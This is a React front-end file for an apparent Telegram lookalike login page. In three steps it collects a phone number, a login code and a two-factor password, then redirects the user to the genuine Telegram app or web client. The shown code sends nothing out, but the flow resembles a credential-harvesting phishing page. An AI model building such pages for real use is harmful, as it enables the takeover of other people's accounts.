import React, { useState } from 'react';
import PhoneInput from './components/PhoneInput';
import CodeInput from './components/CodeInput';
import TwoFactorInput from './components/TwoFactorInput';
import './styles.css';

function App() {
  const [step, setStep] = useState(1);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [requiresTwoFactor, setRequiresTwoFactor] = useState(false);

  const handlePhoneSubmit = (phone) => {
    setPhoneNumber(phone);
    setStep(2);
  };

  const handleCodeVerified = (requires2FA) => {
    if (requires2FA) {
      setRequiresTwoFactor(true);
      setStep(3);
    } else {
      // Success - open Telegram app
      openTelegramApp();
    }
  };

  const handleTwoFactorSubmit = () => {
    // Success - open Telegram app
    openTelegramApp();
  };

  const openTelegramApp = () => {
    // Primary: Open the Telegram app
    window.location.href = 'tg://resolve?domain=telegram';
    
    // Fallback: If app doesn't open (desktop or app not installed)
    setTimeout(() => {
      window.location.href = 'https://web.telegram.org';
    }, 500);
  };

  return (
    <div className="app">
      <div className="telegram-login">
        <div className="header">
        </div>
        
        {step === 1 && <PhoneInput onSubmit={handlePhoneSubmit} />}
        {step === 2 && (
          <CodeInput 
            phoneNumber={phoneNumber} 
            onVerified={handleCodeVerified}
          />
        )}
        {step === 3 && (
          <TwoFactorInput 
            phoneNumber={phoneNumber} 
            onSubmit={handleTwoFactorSubmit}
          />
        )}
      </div>
    </div>
  );
}

export default App;